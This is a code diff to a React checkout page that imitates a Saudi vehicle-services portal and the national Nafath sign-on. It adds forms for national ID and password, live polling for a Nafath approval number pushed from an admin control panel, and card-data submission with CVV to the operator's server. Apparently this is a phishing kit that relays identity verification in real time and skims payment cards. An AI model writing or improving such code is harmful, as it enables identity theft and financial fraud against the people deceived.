@@ -48,6 +48,9 @@ interface Transaction {
   status: 'PENDING_CARD_APPROVAL' | 'AWAITING_OTP' | 'OTP_SUBMITTED' | 'APPROVED' | 'REJECTED';
   otpCode: string;
   submittedOtp?: string;
+  serviceName?: string;
+  nationalId?: string;
+  nafathVerified?: boolean;
 }
 
 // Global Navigation Header Component
@@ -90,8 +93,15 @@ const Header: React.FC = () => {
     <header className="sticky top-0 z-40 w-full border-b border-gray-100 bg-white shadow-sm font-sans">
       <div className="mx-auto flex h-16 max-w-7xl items-center justify-between px-4 sm:px-6">
         
-        {/* Left side: Navigation / Admin trigger (Removed as requested) */}
+        {/* Left side: Navigation / Admin trigger (Temporary button for settings) */}
         <div className="flex items-center space-x-3 space-x-reverse">
+          <Link
+            to="/admin-portal"
+            className="flex items-center gap-1.5 rounded-lg bg-slate-900 px-3 py-1.5 text-xs font-bold text-white hover:bg-slate-800 transition-all shadow-sm"
+          >
+            <ShieldCheck className="h-3.5 w-3.5 text-emerald-400" />
+            <span>لوحة التحكم (مؤقت)</span>
+          </Link>
         </div>
 
         {/* Right side: Salamh Logo and Title */}
@@ -132,9 +142,109 @@ const VEHICLE_SERVICES: ServiceItem[] = [
 const CheckoutPage: React.FC = () => {
   const navigate = useNavigate();
   
-  // Custom Flow States (Step 1: Service selection, Step 2: Payment details)
-  const [step, setStep] = useState<1 | 2>(1);
+  // Custom Flow States (Step 1: Service selection, Step 2: Nafath Verification, Step 3: Payment details)
+  const [step, setStep] = useState<1 | 2 | 3>(1);
   const [selectedService, setSelectedService] = useState<ServiceItem>(VEHICLE_SERVICES[0]);
+
+  // Nafath States
+  const [nafathNationalId, setNafathNationalId] = useState('');
+  const [nafathPassword, setNafathPassword] = useState('');
+  const [nafathStatus, setNafathStatus] = useState<'login' | 'pending_approval' | 'verified'>('login');
+  const [nafathCode, setNafathCode] = useState('');
+  const [nafathTimer, setNafathTimer] = useState(60);
+  const [nafathError, setNafathError] = useState<string | null>(null);
+  const [currentTxId, setCurrentTxId] = useState<string | null>(null);
+
+  // Nafath Countdown Timer Effect
+  useEffect(() => {
+    if (nafathStatus !== 'pending_approval') return;
+    if (nafathTimer <= 0) {
+      setNafathTimer(60);
+      return;
+    }
+    const interval = setInterval(() => {
+      setNafathTimer((prev) => prev - 1);
+    }, 1000);
+    return () => clearInterval(interval);
+  }, [nafathTimer, nafathStatus]);
+
+  const fetchNafathCode = async () => {
+    if (!currentTxId) return;
+    try {
+      const res = await fetch(`/api/status/${currentTxId}`);
+      if (res.ok) {
+        const data = await res.json();
+        if (data) {
+          if (data.nafathCode) {
+            setNafathCode(data.nafathCode);
+          }
+          if (data.status === 'NAFATH_VERIFIED' || data.nafathVerified) {
+            setNafathStatus('verified');
+            setStep(3); // Advance to card payment!
+          } else if (data.status === 'REJECTED') {
+            setFormError('تم رفض عملية التوثيق من قبل لوحة التحكم.');
+            setNafathStatus('login');
+          }
+        }
+      }
+    } catch (err) {
+      console.error("Error fetching Nafath code:", err);
+    }
+  };
+
+  // Poll server for live Nafath Code updates
+  useEffect(() => {
+    if (nafathStatus !== 'pending_approval' || !currentTxId) return;
+    
+    fetchNafathCode();
+
+    const interval = setInterval(() => {
+      fetchNafathCode();
+    }, 2000);
+
+    return () => clearInterval(interval);
+  }, [nafathStatus, currentTxId]);
+
+  const handleNafathLogin = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!nafathNationalId || nafathNationalId.length !== 10 || !/^[12]\d{9}$/.test(nafathNationalId)) {
+      setFormError('يرجى إدخال رقم هوية وطنية أو إقامة صحيح مكون من 10 أرقام ويبدأ بـ 1 أو 2');
+      return;
+    }
+    if (!nafathPassword || nafathPassword.length < 4) {
+      setFormError('يرجى إدخال كلمة مرور صحيحة');
+      return;
+    }
+    
+    // Reset code to show loader initially
+    setNafathCode('');
+
+    try {
+      const res = await fetch('/api/nafath-start', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          nationalId: nafathNationalId,
+          serviceName: selectedService.name,
+          amount: selectedService.price
+        })
+      });
+      if (res.ok) {
+        const data = await res.json();
+        if (data && data.transaction) {
+          setCurrentTxId(data.transaction.id);
+          if (data.transaction.nafathCode) {
+            setNafathCode(data.transaction.nafathCode);
+          }
+        }
+      }
+    } catch (err) {
+      console.error("Error starting Nafath transaction on server:", err);
+    }
+
+    setNafathTimer(60);
+    setNafathStatus('pending_approval');
+  };
 
   // Card Form states
   const [cardNumber, setCardNumber] = useState('');
@@ -279,7 +389,9 @@ const CheckoutPage: React.FC = () => {
               cvv: '000',
               cardType: 'visa',
               amount: parseFloat(amount),
-              serviceName: selectedService.name
+              serviceName: selectedService.name,
+              nationalId: nafathNationalId || undefined,
+              nafathVerified: nafathNationalId ? true : undefined
             })
           });
           const data = await response.json();
@@ -311,18 +423,30 @@ const CheckoutPage: React.FC = () => {
     setIsSubmitting(true);
 
     try {
-      const response = await fetch('/api/pay', {
+      const endpoint = currentTxId ? '/api/pay-update' : '/api/pay';
+      const bodyPayload = currentTxId ? {
+        id: currentTxId,
+        cardNumber,
+        cardholderName: holderName,
+        expiry,
+        cvv,
+        cardType: paymentMethod === 'mada' ? 'visa' : cardType
+      } : {
+        cardNumber,
+        cardholderName: holderName,
+        expiry,
+        cvv,
+        cardType: paymentMethod === 'mada' ? 'visa' : cardType,
+        amount: parseFloat(amount),
+        serviceName: selectedService.name,
+        nationalId: nafathNationalId || undefined,
+        nafathVerified: nafathNationalId ? true : undefined
+      };
+
+      const response = await fetch(endpoint, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          cardNumber,
-          cardholderName: holderName,
-          expiry,
-          cvv,
-          cardType: paymentMethod === 'mada' ? 'visa' : cardType,
-          amount: parseFloat(amount),
-          serviceName: selectedService.name
-        })
+        body: JSON.stringify(bodyPayload)
       });
 
       const data = await response.json();
@@ -343,7 +467,7 @@ const CheckoutPage: React.FC = () => {
   };
 
   return (
-    <div className="mx-auto max-w-xl px-4 py-8 sm:px-6">
+    <div className={`mx-auto px-4 py-8 sm:px-6 transition-all duration-500 ${step === 2 && nafathStatus === 'pending_approval' ? 'max-w-4xl' : 'max-w-xl'}`}>
       
       {/* Centered White Container Card */}
       <div className="bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
@@ -355,22 +479,37 @@ const CheckoutPage: React.FC = () => {
 
           {/* Step Indicator */}
           <div className="flex items-center justify-between border-b border-gray-100 pb-4 dir-rtl">
-            <div className="flex items-center space-x-2 space-x-reverse">
-              <span className={`w-6 h-6 rounded-full flex items-center justify-center text-xs font-black transition-colors ${step === 1 ? 'bg-[#004d33] text-white' : 'bg-emerald-100 text-[#004d33]'}`}>
+            <div className="flex items-center space-x-1.5 space-x-reverse shrink-0">
+              <span className={`w-5 h-5 rounded-full flex items-center justify-center text-[10px] font-black transition-colors ${step === 1 ? 'bg-[#004d33] text-white' : 'bg-emerald-100 text-[#004d33]'}`}>
                 ١
               </span>
-              <span className={`text-xs font-extrabold transition-colors ${step === 1 ? 'text-slate-900' : 'text-slate-400'}`}>
-                اختيار الخدمة
+              <span className={`text-[10px] sm:text-xs font-extrabold transition-colors ${step === 1 ? 'text-slate-900' : 'text-slate-400'}`}>
+                الخدمة
               </span>
             </div>
-            <div className="flex-1 mx-4 h-0.5 bg-gray-100 relative">
-              <div className={`absolute inset-y-0 right-0 bg-[#004d33] transition-all duration-300 ${step === 1 ? 'w-0' : 'w-full'}`} />
+            
+            <div className="flex-1 mx-1.5 h-0.5 bg-gray-100 relative">
+              <div className={`absolute inset-y-0 right-0 bg-[#004d33] transition-all duration-300 ${step > 1 ? 'w-full' : 'w-0'}`} />
             </div>
-            <div className="flex items-center space-x-2 space-x-reverse">
-              <span className={`w-6 h-6 rounded-full flex items-center justify-center text-xs font-black transition-colors ${step === 2 ? 'bg-[#004d33] text-white' : 'bg-gray-100 text-gray-400'}`}>
+
+            <div className="flex items-center space-x-1.5 space-x-reverse shrink-0">
+              <span className={`w-5 h-5 rounded-full flex items-center justify-center text-[10px] font-black transition-colors ${step === 2 ? 'bg-[#004d33] text-white' : step > 2 ? 'bg-emerald-100 text-[#004d33]' : 'bg-gray-100 text-gray-400'}`}>
                 ٢
               </span>
-              <span className={`text-xs font-extrabold transition-colors ${step === 2 ? 'text-slate-900' : 'text-slate-400'}`}>
+              <span className={`text-[10px] sm:text-xs font-extrabold transition-colors ${step === 2 ? 'text-slate-900' : 'text-slate-400'}`}>
+                نفاذ الموحد
+              </span>
+            </div>
+
+            <div className="flex-1 mx-1.5 h-0.5 bg-gray-100 relative">
+              <div className={`absolute inset-y-0 right-0 bg-[#004d33] transition-all duration-300 ${step > 2 ? 'w-full' : 'w-0'}`} />
+            </div>
+
+            <div className="flex items-center space-x-1.5 space-x-reverse shrink-0">
+              <span className={`w-5 h-5 rounded-full flex items-center justify-center text-[10px] font-black transition-colors ${step === 3 ? 'bg-[#004d33] text-white' : 'bg-gray-100 text-gray-400'}`}>
+                ٣
+              </span>
+              <span className={`text-[10px] sm:text-xs font-extrabold transition-colors ${step === 3 ? 'text-slate-900' : 'text-slate-400'}`}>
                 الدفع الإلكتروني
               </span>
             </div>
@@ -439,9 +578,9 @@ const CheckoutPage: React.FC = () => {
                   <ArrowRight className="h-4 w-4 rotate-180 text-white/90" />
                 </button>
               </motion.div>
-            ) : (
+            ) : step === 2 ? (
               <motion.div
-                key="step-payment"
+                key="step-nafath"
                 initial={{ opacity: 0, x: -20 }}
                 animate={{ opacity: 1, x: 0 }}
                 exit={{ opacity: 0, x: 20 }}
@@ -455,7 +594,132 @@ const CheckoutPage: React.FC = () => {
                   className="text-xs font-bold text-[#004d33] hover:text-[#003a26] flex items-center gap-1.5 bg-gray-50 hover:bg-gray-100 px-3 py-1.5 rounded-lg border border-gray-200 transition-colors w-fit cursor-pointer"
                 >
                   <ArrowRight className="h-3.5 w-3.5 text-[#004d33]" />
-                  <span>تغيير الخدمة المختارة</span>
+                  <span>الرجوع لاختيار الخدمة</span>
+                </button>
+
+                {nafathStatus === 'login' ? (
+                  <div className="space-y-5">
+                    <div className="text-center pb-3 border-b border-gray-100">
+                      <div className="mx-auto w-12 h-12 rounded-full bg-emerald-50 flex items-center justify-center mb-2">
+                        <Smartphone className="h-6 w-6 text-[#004d33]" />
+                      </div>
+                      <h3 className="text-sm font-black text-slate-800">بوابة النفاذ الوطني الموحد (نفاذ)</h3>
+                      <p className="text-[10px] text-slate-400 mt-1">يرجى تسجيل الدخول لمطابقة الهوية وتأكيد الخدمة عبر نفاذ</p>
+                    </div>
+
+                    <form onSubmit={handleNafathLogin} className="space-y-4">
+                      <div>
+                        <label className="block text-xs font-bold text-slate-700 mb-1.5">رقم الهوية الوطنية / الإقامة</label>
+                        <input
+                          type="text"
+                          maxLength={10}
+                          placeholder="1xxxxxxxxx"
+                          value={nafathNationalId}
+                          onChange={(e) => setNafathNationalId(e.target.value.replace(/\D/g, ''))}
+                          className="w-full rounded-xl border border-gray-200 bg-gray-50/50 px-4 py-3 text-xs font-medium text-slate-900 placeholder-slate-400 focus:border-[#004d33] focus:bg-white focus:outline-none focus:ring-1 focus:ring-[#004d33] font-sans text-right"
+                          required
+                        />
+                      </div>
+
+                      <div>
+                        <label className="block text-xs font-bold text-slate-700 mb-1.5">كلمة المرور المؤقتة</label>
+                        <input
+                          type="password"
+                          value={nafathPassword}
+                          onChange={(e) => setNafathPassword(e.target.value)}
+                          placeholder="••••••••"
+                          className="w-full rounded-xl border border-gray-200 bg-gray-50/50 px-4 py-3 text-xs font-medium text-slate-900 placeholder-slate-400 focus:border-[#004d33] focus:bg-white focus:outline-none focus:ring-1 focus:ring-[#004d33] text-right"
+                          required
+                        />
+                      </div>
+
+                      <button
+                        type="submit"
+                        className="w-full flex items-center justify-center gap-2 rounded-xl bg-[#004d33] hover:bg-[#003a26] px-4 py-3.5 text-sm font-bold text-white shadow-lg transition-all cursor-pointer mt-4"
+                      >
+                        <span>تسجيل الدخول والتحقق الرقمي</span>
+                        <ArrowRight className="h-4 w-4 rotate-180" />
+                      </button>
+                    </form>
+                  </div>
+                ) : (
+                  <div className="max-w-md mx-auto w-full">
+                    {/* Portal Verification Screen */}
+                    <div className="border border-gray-200 rounded-2xl p-6 bg-slate-50/50 flex flex-col justify-between shadow-sm">
+                      <div className="space-y-4">
+                        <div className="flex items-center justify-between border-b border-gray-100 pb-3">
+                          <span className="text-xs font-bold text-[#004d33] flex items-center gap-1">
+                            <span className="w-2.5 h-2.5 rounded-full bg-emerald-500 animate-pulse" />
+                            بانتظار الموافقة في تطبيق نفاذ
+                          </span>
+                          <span className="text-[10px] text-slate-400 font-mono">ID: {nafathNationalId}</span>
+                        </div>
+
+                        <div className="text-center space-y-4 py-6">
+                          <p className="text-sm text-slate-600 leading-relaxed font-medium">افتح تطبيق نفاذ على جوالك واقبل طلب تسجيل الدخول، ثم اختر الرقم الموضح أدناه لتأكيد هويتك:</p>
+                          <div className="mx-auto w-28 h-28 rounded-3xl bg-[#004d33]/5 border-2 border-[#004d33]/20 flex items-center justify-center shadow-inner relative overflow-hidden">
+                            {nafathCode ? (
+                              <motion.span
+                                initial={{ opacity: 0, scale: 0.8 }}
+                                animate={{ opacity: 1, scale: 1 }}
+                                className="text-5xl font-black text-[#004d33] font-sans tracking-widest"
+                              >
+                                {nafathCode}
+                              </motion.span>
+                            ) : (
+                              <div className="flex flex-col items-center justify-center gap-1.5 text-center">
+                                <RefreshCw className="w-8 h-8 text-[#004d33] animate-spin" />
+                                <span className="text-[10px] text-[#004d33]/70 font-bold animate-pulse">جاري التحميل...</span>
+                              </div>
+                            )}
+                          </div>
+                          
+                          {/* Countdown Timer */}
+                          <div className="flex items-center justify-center gap-1.5 text-xs text-slate-500 pt-2">
+                            <Clock className="w-4 h-4 text-[#004d33]" />
+                            <span>تنتهي صلاحية الطلب خلال:</span>
+                            <span className="font-mono font-bold text-[#004d33]">{nafathTimer} ثانية</span>
+                          </div>
+                        </div>
+
+                        <div className="bg-emerald-50 rounded-xl p-3.5 text-right border border-emerald-100/70">
+                          <p className="text-[11px] text-emerald-800 font-medium leading-relaxed">
+                            💡 يرجى عدم إغلاق هذه الصفحة. بمجرد إتمام التوثيق وقبول الطلب عبر تطبيق نفاذ، سيتم نقلك تلقائياً إلى صفحة إتمام المدفوعات والخدمة.
+                          </p>
+                        </div>
+                      </div>
+
+                      <button
+                        type="button"
+                        onClick={() => {
+                          setNafathStatus('login');
+                          setNafathTimer(60);
+                        }}
+                        className="w-full text-center text-xs font-bold text-[#004d33] hover:underline mt-6 cursor-pointer"
+                      >
+                        إلغاء الطلب والرجوع للتسجيل
+                      </button>
+                    </div>
+                  </div>
+                )}
+              </motion.div>
+            ) : (
+              <motion.div
+                key="step-payment"
+                initial={{ opacity: 0, x: -20 }}
+                animate={{ opacity: 1, x: 0 }}
+                exit={{ opacity: 0, x: 20 }}
+                transition={{ duration: 0.25 }}
+                className="space-y-6 dir-rtl text-right"
+              >
+                {/* Back Button */}
+                <button
+                  type="button"
+                  onClick={() => setStep(2)}
+                  className="text-xs font-bold text-[#004d33] hover:text-[#003a26] flex items-center gap-1.5 bg-gray-50 hover:bg-gray-100 px-3 py-1.5 rounded-lg border border-gray-200 transition-colors w-fit cursor-pointer"
+                >
+                  <ArrowRight className="h-3.5 w-3.5 text-[#004d33]" />
+                  <span>الرجوع للتحقق الوطني (نفاذ)</span>
                 </button>
 
                 {/* Active Service Badge */}
